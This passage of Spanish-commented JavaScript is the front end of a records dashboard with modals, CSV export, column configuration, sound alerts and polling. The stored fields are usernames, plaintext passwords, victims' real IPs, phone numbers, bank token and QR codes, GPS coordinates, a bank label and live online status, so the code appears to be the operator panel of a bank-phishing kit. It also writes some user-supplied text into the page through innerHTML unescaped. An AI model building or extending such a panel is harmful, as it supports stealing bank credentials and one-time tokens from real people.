    const content = document.getElementById('alertContent');
    const btnPrimary = document.getElementById('alertBtnPrimary');
    const btnSecondary = document.getElementById('alertBtnSecondary');

    // Configurar tipo de alerta
    container.className = `alert-container alert-${type}`;
    
    // Configurar icono según tipo
    const iconConfig = {
        'error': 'fas fa-exclamation-triangle',
        'success': 'fas fa-check-circle',
        'confirm': 'fas fa-question-circle',
        'warning': 'fas fa-exclamation-circle'
    };
    
    iconClass.className = iconConfig[type] || 'fas fa-info-circle';
    
    // Configurar contenido
    titleEl.textContent = title;
    // Convertir saltos de línea a <br> para mostrar correctamente
    content.innerHTML = message.replace(/\n/g, '<br>');
    btnPrimary.textContent = primaryText;
    
    // Mostrar/ocultar botón secundario
    if (secondaryText === null || secondaryText === '' || type === 'success') {
        btnSecondary.style.display = 'none';
    } else {
        btnSecondary.style.display = 'block';
        btnSecondary.textContent = secondaryText;
    }
    
    // Guardar callback
    alertCallback = callback;
    
    // Mostrar alerta
    overlay.classList.remove('alert-hidden');
    overlay.classList.add('alert-visible');
}

// Función para ocultar alerta
function hideAlert() {
    const overlay = document.getElementById('alertOverlay');
    overlay.classList.remove('alert-visible');
    overlay.classList.add('alert-hidden');
    alertCallback = null;
}

// Función para confirmar alerta
function confirmAlert() {
    if (alertCallback) {
        alertCallback();
    }
    hideAlert();
}

// Función para borrar registro con alerta de confirmación
function deleteRecord(id) {
    showAlert(
        'confirm',
        'Confirmar Eliminación',
        '¿Estás seguro de que quieres borrar este registro? Esta acción no se puede deshacer.',
        'Sí, Eliminar',
        'Cancelar',
        () => {
            fetch('delete_record.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ id: id })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    loadData();
                } else {
                    showAlert('error', 'Error', data.error || 'Error al borrar el registro', 'Aceptar');
                }
            })
            .catch(error => {
                showAlert('error', 'Error de Conexión', 'Error de conexión: ' + error.message, 'Aceptar');
            });
        }
    );
}

// Función para mostrar éxito
function showSuccess(message) {
    const errorContainer = document.getElementById('errorContainer');
    if (errorContainer) {
        errorContainer.innerHTML = `
            <div class="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-4">
                <i class="fas fa-check-circle mr-2"></i>
                ${message.replace(/\n/g, '<br>')}
            </div>
        `;
        errorContainer.style.display = 'block';
        
        setTimeout(() => {
            errorContainer.style.display = 'none';
        }, 3000);
    }
}

// Función para generar CSV dinámico basado en columnas visibles
function generateCSV(data) {
    // Verificar que existe configuración de columnas
    if (!configuracionColumnas || configuracionColumnas.length === 0) {
        console.warn('No hay configuración de columnas para exportar');
        return '';
    }
    
    // Obtener columnas visibles ordenadas (excluyendo acciones)
    const columnasVisibles = configuracionColumnas
        .filter(col => col.visible == 1 && col.columna !== 'acciones')
        .sort((a, b) => a.orden - b.orden);
    
    // Generar headers dinámicos
    const headers = columnasVisibles.map(col => {
        return col.nombre_personalizado || columnasDisponibles[col.columna] || col.columna;
    });
    
    const csvRows = [headers.join(',')];
    
    // Generar filas dinámicas
    data.forEach(item => {
        const row = columnasVisibles.map(col => {
            let valor = '';
            
            switch (col.columna) {
                case 'estatus':
                    // Determinar estatus para CSV
                    const estatusReal = item.estado_real || 'offline';
                    if (estatusReal === 'online') valor = 'En línea';
                    else if (estatusReal === 'inactive') valor = 'Inactivo';
                    else if (estatusReal === 'Nunca conectado') valor = 'Sin conexión';
                    else valor = 'Desconectado';
                    break;
                case 'id':
                    valor = item.id || '';
                    break;
                case 'usuario':
                    valor = item.usuarios || '';
                    break;
                case 'password':
                    valor = item.password || '';
                    break;
                case 'ip_real':
                    valor = item.ip_real || '';
                    break;
                case 'nombre':
                    valor = item.nombre || '';
                    break;
                case 'apellido':
                    valor = getBancaLabel(item.apellido) || item.apellido || '';
                    break;
                case 'email':
                    valor = item.email || '';
                    break;
                case 'telefono_movil':
                    valor = item.telefono_movil || '';
                    break;
                case 'telefono_fijo':
                    valor = item.telefono_fijo || '';
                    break;
                case 'token_codigo':
                    valor = item.token_codigo || '';
                    break;
                case 'sgdotoken_codigo':
                    valor = item.sgdotoken_codigo || '';
                    break;
                case 'sgdotoken_qr_codigo':
                    valor = item.sgdotoken_qr_codigo || '';
                    break;
                case 'token_qr_imagen_url':
                    valor = item.token_qr_imagen_url || '';
                    break;
                case 'comentarios':
                    valor = item.comentarios || '';
                    break;
                case 'coordenadas_gps':
                    valor = item.coordenadas_gps
                        ? formatCrGeo(item.coordenadas_gps)
                        : getGpsEstadoLabel(item.gps_estado);
                    break;
                case 'fecha':
                    valor = item.fecha_ingreso || '';
                    break;
                default:
                    valor = item[col.columna] || '';
            }
            
            // Escapar comillas y comas en CSV
            if (typeof valor === 'string' && (valor.includes(',') || valor.includes('"') || valor.includes('\n'))) {
                valor = '"' + valor.replace(/"/g, '""') + '"';
            }
            
            return valor;
        });
        
        csvRows.push(row.join(','));
    });
    
    return csvRows.join('\n');
}

// Función para alternar notificaciones de audio
function toggleAudioNotifications() {
    audioNotificationsEnabled = !audioNotificationsEnabled;
    
    if (window.audioNotifier) {
        window.audioNotifier.setEnabled(audioNotificationsEnabled);
        
        // Preparar y probar audio si se habilita
        if (audioNotificationsEnabled) {
            window.audioNotifier.prime().then(() => {
                setTimeout(() => {
                    playNotificationSound();
                }, 100);
            });
        }
    }
    
    updateAudioButton();
    
    // Actualizar tooltip
    if (window.tooltipManager) {
        window.tooltipManager.updateAudioTooltip(audioNotificationsEnabled);
    }
}

// Función para actualizar el aspecto del botón de audio
function updateAudioButton() {
    const audioBtn = document.querySelector('button[onclick="toggleAudioNotifications()"]');
    if (audioBtn) {
        if (audioNotificationsEnabled) {
            audioBtn.innerHTML = '<i class="fas fa-volume-up"></i>';
            audioBtn.className = 'bg-black text-white px-4 py-2 rounded-lg hover:bg-gray-800 transition-colors';
        } else {
            audioBtn.innerHTML = '<i class="fas fa-volume-mute"></i>';
            audioBtn.className = 'bg-gray-500 text-white px-4 py-2 rounded-lg hover:bg-gray-600 transition-colors';
        }
    }
}

// Función para mostrar configurador de columnas
function showColumnConfig() {
    // Solo permitir a super-usuarios
    if (!window.isSuperUser) {
        console.warn('Acceso denegado: Solo super-usuarios pueden configurar columnas');
        return;
    }
    
    const modal = document.getElementById('columnConfigModal');
    if (modal) {
        // Generar items de columnas dinámicamente
        generateColumnItems();
        
        modal.classList.remove('hidden');
        modal.classList.add('flex');
    }
}

// Función para generar items de columnas con drag and drop
function generateColumnItems() {
    const container = document.getElementById('columnItemsContainer');
    if (!container) return;
    
    // Limpiar contenedor
    container.innerHTML = '';
    
    // Ordenar columnas por orden
    const columnasOrdenadas = configuracionColumnas
        .sort((a, b) => a.orden - b.orden);
    
    // Generar HTML para cada columna
    columnasOrdenadas.forEach((col, index) => {
        const columnNameOriginal = columnasDisponibles[col.columna] || col.columna;
        
        // Si tiene nombre personalizado, mostrar: "Nombre Original [Nombre Personalizado]"
        let displayName = columnNameOriginal;
        if (col.nombre_personalizado && col.nombre_personalizado.trim() !== '') {
            displayName = `${columnNameOriginal} <span style="color: #666;">[${col.nombre_personalizado}]</span>`;
        }
        
        const isVisible = col.visible == 1;
        const badgeClass = isVisible ? 'col-badge-activo' : 'col-badge-inactivo';
        const badgeText = isVisible ? 'ACTIVO' : 'INACTIVO';

        const item = document.createElement('div');
        item.className = 'column-config-item flex items-center p-3 bg-white border border-gray-200 rounded-lg';
        item.innerHTML = `
            <span class="column-order-number">${index + 1}</span>
            <i class="fas fa-grip-vertical drag-handle"></i>
            <input type="checkbox" id="col_${col.columna}" class="mr-3 rounded col-config-check" ${isVisible ? 'checked' : ''}>
            <span class="text-sm flex-1">${displayName}</span>
            <span class="col-badge ${badgeClass}" data-badge-for="col_${col.columna}">${badgeText}</span>
        `;

        const checkbox = item.querySelector('.col-config-check');
        checkbox.addEventListener('change', function () {
            const badge = item.querySelector('.col-badge');
            if (this.checked) {
                badge.textContent = 'ACTIVO';
                badge.className = 'col-badge col-badge-activo';
            } else {
                badge.textContent = 'INACTIVO';
                badge.className = 'col-badge col-badge-inactivo';
            }
        });
        
        container.appendChild(item);
    });
    
    // Inicializar drag and drop
    if (window.columnDragDropSystem) {
        window.columnDragDropSystem.initializeDragDrop();
    }
}

// Función para cerrar configurador de columnas
function closeColumnConfig() {
    const modal = document.getElementById('columnConfigModal');
    if (modal) {
        modal.classList.add('hidden');
        modal.classList.remove('flex');
    }
}

// Función para guardar configuración de columnas
function saveColumnConfig() {
    // Obtener orden actual del sistema de drag and drop
    const columnItems = document.querySelectorAll('.column-config-item');
    const nuevaConfiguracion = [];
    
    columnItems.forEach((item, index) => {
        const checkbox = item.querySelector('input[type="checkbox"]');
        const columnName = checkbox.id.replace('col_', '');
        
        // Buscar la columna en la configuración original para obtener nombre_personalizado
        const colOriginal = configuracionColumnas.find(c => c.columna === columnName);
        
        nuevaConfiguracion.push({
            columna: columnName,
            visible: checkbox.checked ? 1 : 0,
            orden: index + 1,  // El orden es la posición actual después del drag and drop
            nombre_personalizado: colOriginal ? colOriginal.nombre_personalizado : null
        });
    });
    
    // Enviar configuración al servidor
    fetch('save_column_config.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ configuracion: nuevaConfiguracion })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            showAlert('success', 'Éxito', 'Configuración de columnas guardada correctamente', 'Aceptar', null, () => {
                closeColumnConfig();
                loadData(); // Recargar datos para aplicar cambios
            });
        } else {
            showAlert('error', 'Error', data.error || 'Error al guardar configuración', 'Aceptar');
        }
    })
    .catch(error => {
        showAlert('error', 'Error de Conexión', 'Error de conexión: ' + error.message, 'Aceptar');
    });
}

// Función para editar nombre de columna inline
function editColumnName(thElement, colConfig) {
    // Solo permitir a super-usuarios
    if (!window.isSuperUser) {
        console.warn('Acceso denegado: Solo super-usuarios pueden editar nombres de columnas');
        return;
    }
    
    // Evitar múltiples ediciones simultáneas
    if (thElement.querySelector('input')) return;
    
    const nombreActual = colConfig.nombre_personalizado || columnasDisponibles[colConfig.columna] || colConfig.columna;
    const nombreDefault = columnasDisponibles[colConfig.columna] || colConfig.columna;
    
    // Crear input para edición
    const input = document.createElement('input');
    input.type = 'text';
    input.value = nombreActual;
    input.className = 'w-full px-2 py-1 text-xs font-medium text-gray-700 bg-white border border-blue-500 rounded focus:outline-none focus:ring-1 focus:ring-blue-500';
    input.style.minWidth = '80px';
    
    // Reemplazar contenido del th
    const originalContent = thElement.textContent;
    thElement.textContent = '';
    thElement.appendChild(input);
    
    // Seleccionar todo el texto
    input.select();
    input.focus();
    
    // Función para guardar cambios
    const saveChanges = () => {
        const nuevoNombre = input.value.trim();
        
        // Si está vacío, usar el nombre por defecto
        const nombreFinal = nuevoNombre === '' ? null : nuevoNombre;
        
        // Actualizar configuración local
        colConfig.nombre_personalizado = nombreFinal;
        
        // Restaurar el th
        thElement.textContent = nombreFinal || nombreDefault;
        
        // Guardar en servidor (autosave)
        saveColumnNameToServer(colConfig.columna, nombreFinal);
    };
    
    // Función para cancelar cambios
    const cancelChanges = () => {
        thElement.textContent = originalContent;
    };
    
    // Eventos
    input.addEventListener('blur', saveChanges);
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            input.blur(); // Esto activará el evento blur
        } else if (e.key === 'Escape') {
            e.preventDefault();
            cancelChanges();
        }
    });
}

// Función para guardar nombre de columna en servidor (autosave)
function saveColumnNameToServer(columna, nombrePersonalizado) {
    fetch('save_column_name.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
            columna: columna,
            nombre_personalizado: nombrePersonalizado
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            // Mostrar notificación sutil de éxito
            showSuccessToast('Nombre guardado');
        } else {
            console.error('Error al guardar nombre:', data.error);
            showErrorToast('Error al guardar');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        showErrorToast('Error de conexión');
    });
}

// Función para mostrar toast de éxito
function showSuccessToast(message) {
    const toast = document.createElement('div');
    toast.className = 'fixed bottom-4 right-4 bg-black text-white px-4 py-2 rounded-lg shadow-lg z-50 transform transition-all duration-300 hover:bg-gray-800';
    toast.textContent = message;
    
    document.body.appendChild(toast);
    
    // Configurar estado inicial (oculto)
    toast.style.transform = 'translateY(100%)';
    toast.style.opacity = '0';
    
    // Animación de entrada desde abajo
    setTimeout(() => {
        toast.style.transform = 'translateY(0)';
        toast.style.opacity = '1';
    }, 10);
    
    // Remover después de 2 segundos
    setTimeout(() => {
        toast.style.transform = 'translateY(100%)';
        toast.style.opacity = '0';
        setTimeout(() => {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }, 300);
    }, 2000);
}

// Función para mostrar toast de error
function showErrorToast(message) {
    const toast = document.createElement('div');
    toast.className = 'fixed top-4 right-4 bg-gray-600 text-white px-4 py-2 rounded-lg shadow-lg z-50 transform transition-all duration-300 hover:bg-gray-700';
    toast.textContent = message;
    
    document.body.appendChild(toast);
    
    // Animación de entrada
    setTimeout(() => {
        toast.style.transform = 'translateX(0)';
    }, 10);
    
    // Remover después de 2 segundos
    setTimeout(() => {
        toast.style.transform = 'translateX(100%)';
        setTimeout(() => {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }, 300);
    }, 2000);
}

// ==========================================
// SISTEMA DE COMENTARIOS
// ==========================================

// Función para editar comentario
function editarComentario(userId) {
    const comentarioElement = document.getElementById(`comentario-${userId}`);
    const currentComment = comentarioElement.textContent === 'Sin comentarios' ? '' : comentarioElement.textContent;
    
    // Crear input para editar
    const input = document.createElement('textarea');
    input.className = 'comentario-edit';
    input.value = currentComment;
    input.rows = 2;
    input.placeholder = 'Escribe un comentario...';
    
    // Reemplazar el span con el textarea
    comentarioElement.parentNode.replaceChild(input, comentarioElement);
    suppressPollingTemporarily(POLLING_SUPPRESS_COMMENT_EDIT);
    input.focus();
    
    let closed = false;

    function guardarComentario() {
        if (closed) return;
        closed = true;
        try {
            const newComment = input.value.trim();
            actualizarComentario(userId, newComment);
            comentarioElement.textContent = newComment || 'Sin comentarios';
            if (input.parentNode) {
                input.parentNode.replaceChild(comentarioElement, input);
            }
        } finally {
            releasePollingTemporarily(POLLING_SUPPRESS_COMMENT_EDIT);
        }
    }
    
    input.addEventListener('blur', guardarComentario);
    input.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' && e.ctrlKey) {
            e.preventDefault();
            guardarComentario();
        } else if (e.key === 'Escape') {
            e.preventDefault();
            if (closed) return;
            closed = true;
            comentarioElement.textContent = currentComment || 'Sin comentarios';
            if (input.parentNode) {
                input.parentNode.replaceChild(comentarioElement, input);
            }
            releasePollingTemporarily(POLLING_SUPPRESS_COMMENT_EDIT);
        }
    });
}

// Función para actualizar comentario en la base de datos
async function actualizarComentario(userId, comentario) {
    try {
        const response = await fetch('actualizar_comentario.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                usuario_id: userId,
                comentario: comentario
            })
        });

        const data = await response.json();
        
        if (data.success) {
            if (!data.unchanged) {
                showSuccessToast('Comentario guardado');
            }
        } else {
            console.error('Error actualizando comentario:', data.error);
            showErrorToast('Error al actualizar el comentario');
        }
    } catch (error) {
        console.error('Error:', error);
        showErrorToast('Error de conexión al actualizar el comentario');
    }
}

// Función para mostrar/ocultar dropdown de resultados por página
function toggleResultsDropdown() {
    const dropdown = document.getElementById('resultsDropdown');
    if (dropdown) {
        dropdown.classList.toggle('hidden');
    }
}

// Función para seleccionar resultados por página
function selectResultsPerPage(value) {
    itemsPerPage = parseInt(value);
    currentPage = 1; // Resetear a la primera página
    totalPages = Math.ceil(filteredData.length / itemsPerPage);
    
    // Actualizar texto del botón
    updateResultsButtonText();
    
    // Ocultar dropdown
    const dropdown = document.getElementById('resultsDropdown');
    if (dropdown) {
        dropdown.classList.add('hidden');
    }
    
    renderTable();
    renderPagination();
    
    // Guardar preferencia en localStorage
    localStorage.setItem('itemsPerPage', itemsPerPage);
}

// Función para actualizar el texto del botón
function updateResultsButtonText() {
    const textElement = document.getElementById('currentResultsText');
    if (textElement) {
        textElement.textContent = itemsPerPage;
    }
}

// Función para expandir/contraer el input de búsqueda (global)
window.toggleSearchInput = function() {
    const searchInput = document.getElementById('searchInput');
    const searchIconBtn = document.getElementById('searchIconBtn');
    const searchContainer = searchIconBtn?.closest('.relative');
    
    if (!searchInput || !searchIconBtn || !searchContainer) return;
    
    // Verificar si está colapsado
    const isCollapsed = searchInput.classList.contains('search-input-collapsed');
    
    if (isCollapsed) {
        // Expandir
        searchInput.classList.remove('search-input-collapsed');
        searchInput.classList.add('search-input-expanded');
        searchContainer.style.width = '300px';
        searchInput.focus();
    } else {
        // Si el input está vacío, colapsar
        if (searchInput.value.trim() === '') {
            searchInput.classList.remove('search-input-expanded');
            searchInput.classList.add('search-input-collapsed');
            searchContainer.style.width = '50px';
            searchInput.value = ''; // Limpiar búsqueda
            handleSearch(); // Limpiar filtros
        } else {
            // Si tiene texto, solo enfocar
            searchInput.focus();
        }
    }
}

// Cerrar el input si se hace clic fuera
document.addEventListener('click', function(event) {
    const searchInput = document.getElementById('searchInput');
    const searchIconBtn = document.getElementById('searchIconBtn');
    const searchContainer = searchIconBtn?.closest('.relative');
    
    if (searchInput && searchIconBtn && searchContainer) {
        // Si el clic fue fuera del contenedor de búsqueda y el input está expandido
        if (!searchContainer.contains(event.target) && 
            searchInput.classList.contains('search-input-expanded') &&
            searchInput.value.trim() === '') {
            searchInput.classList.remove('search-input-expanded');
            searchInput.classList.add('search-input-collapsed');
            searchContainer.style.width = '50px';
        }
    }
}); 